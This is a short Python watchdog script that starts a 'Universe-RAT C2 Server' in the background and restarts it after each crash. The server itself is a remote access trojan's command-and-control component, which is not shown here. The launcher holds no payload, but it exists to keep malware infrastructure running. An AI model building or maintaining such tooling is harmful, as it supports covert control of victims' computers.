#!/usr/bin/env python3
"""
Universe-RAT C2 Server - Auto-start daemon
Runs in background, auto-restart on crash
"""
import os
import sys
import time
import subprocess
from pathlib import Path

C2_DIR = Path("F:/universe_rat_system/c2_server")
C2_SCRIPT = C2_DIR / "server.py"
PYTHON = sys.executable

def start_c2():
    """Start C2 server in background"""
    print("🔥 Starting Universe-RAT C2 Server...")
    
    # Run in background
    process = subprocess.Popen(
        [PYTHON, str(C2_SCRIPT)],
        cwd=str(C2_DIR),
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        creationflags=subprocess.CREATE_NEW_CONSOLE if os.name == 'nt' else 0
    )
    
    print(f"✅ C2 Server started (PID: {process.pid})")
    print(f"📊 Dashboard: http://localhost:8443")
    
    return process

def main():
    while True:
        try:
            proc = start_c2()
            
            # Monitor process
            while proc.poll() is None:
                time.sleep(5)
            
            print(f"⚠️  C2 Server crashed (exit code {proc.returncode})")
            print("🔄 Restarting in 5 seconds...")
            time.sleep(5)
            
        except KeyboardInterrupt:
            print("\n🛑 Stopping C2 Server...")
            if proc:
                proc.terminate()
            break
        except Exception as e:
            print(f"❌ Error: {e}")
            time.sleep(10)

if __name__ == "__main__":
    main()
